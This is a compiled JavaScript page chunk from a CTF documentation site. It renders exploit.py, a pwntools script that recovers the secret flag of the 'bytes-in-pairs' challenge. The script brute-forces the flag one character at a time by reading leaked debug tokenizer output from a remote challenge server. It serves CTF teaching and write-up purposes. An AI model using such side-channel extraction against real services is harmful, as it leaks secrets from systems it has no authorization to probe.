"use strict";(self.webpackChunkictf_docs=self.webpackChunkictf_docs||[]).push([[3132],{7330:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>s,default:()=>f,frontMatter:()=>i,metadata:()=>l,toc:()=>p});var r=t(4848),o=t(8453);const i={},s=void 0,l={id:"writeups/bytes-in-pairs/exploit.py",title:"exploit.py",description:"",source:"@site/docs/writeups/bytes-in-pairs/exploit.py.md",sourceDirName:"writeups/bytes-in-pairs",slug:"/writeups/bytes-in-pairs/exploit.py",permalink:"/ictf-docs/writeups/bytes-in-pairs/exploit.py",draft:!1,unlisted:!1,editUrl:"https://github.com/ucsb-seclab/ictf-docs/tree/main/docs/writeups/bytes-in-pairs/exploit.py.md",tags:[],version:"current",frontMatter:{},sidebar:"writeups",previous:{title:"bytes_in_pairs",permalink:"/ictf-docs/writeups/bytes-in-pairs/"},next:{title:"CI Ninja",permalink:"/ictf-docs/writeups/ci-ninja/"}},a={},p=[];function c(e){const n={code:"code",pre:"pre",...(0,o.R)(),...e.components};return(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"import string\r\nimport json\r\nfrom pwn import *\r\nfrom ast import literal_eval\r\n\r\nprefix = 'ictf{'\r\n\r\n# Against localhost: bruteforce takes ~8mins\r\n# Against remote: bruteforce takes ~10mins with the shorter dictionary\r\n\r\ndef try_flag(flag):\r\n    with context.local(log_level='error'):\r\n        # r = process(['python3', 'chall.py'])\r\n        r = remote('0.cloud.chals.io', 21308)\r\n    try:\r\n        r.sendlineafter('Please submit the statement to be classified:\\n', flag)\r\n        r.recvuntil(\"[DEBUG] Resulting tokenization: new_tokens=\")\r\n        tokenization = literal_eval(r.recvline().decode())\r\n        filtered_tokens = []\r\n        for token in tokenization:\r\n            while '</w>' in token:\r\n                token = token.replace('</w>', '')\r\n            filtered_tokens.append(token)\r\n\r\n        r.recvuntil(\"[DEBUG] Newly learned tokens: \")\r\n        new_tokens = literal_eval(r.recvline().decode())\r\n        filtered_new_tokens = []\r\n        for token in new_tokens:\r\n            while '</w>' in token:\r\n                token = token.replace('</w>', '')\r\n            filtered_new_tokens.append(token)\r\n        r.recvuntil(\"Please classify the above statement as \\\"human\\\" or \\\"robot\\\":\\n\")\r\n        r.sendline('human')\r\n        return filtered_tokens, filtered_new_tokens\r\n    finally:\r\n        with context.local(log_level='error'):\r\n            r.close()\r\n\r\n\r\n# import ipdb; ipdb.set_trace()\r\nwhile True:\r\n    all_options = list(string.ascii_lowercase + string.digits + '_\\{\\}')\r\n    tokens, baseline_new_tokens = try_flag(prefix + \"{{{{{{{\")\r\n\r\n    all_options = list(sorted(list(tokens) + all_options))\r\n    # all_options = list(sorted(all_options))\r\n    new_tokens_results = {}\r\n    for option in all_options:\r\n        flag = prefix + option\r\n        tokens, new_tokens = try_flag(flag + \"{{{{{{{\")\r\n        new_flag_tokens = [token for token in new_tokens if token.startswith(prefix)]\r\n        if not new_flag_tokens:\r\n            continue\r\n        longest_flag_token = max(new_flag_tokens, key=len)\r\n        new_tokens_results[option] = longest_flag_token\r\n        print(f\"{flag=} {len(new_flag_tokens)=} {new_flag_tokens=}\")\r\n\r\n    # pick the one that has the longest new token\r\n    max_option = max(new_tokens_results, key=lambda k: len(new_tokens_results[k]))\r\n    print(f\"max_option: {max_option=} {len(new_tokens_results[max_option])=}\")\r\n    prefix += max_option\r\n    if '}' in prefix:\r\n        break\n"})})}function f(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>s,x:()=>l});var r=t(6540);const o={},i=r.createContext(o);function s(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:s(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);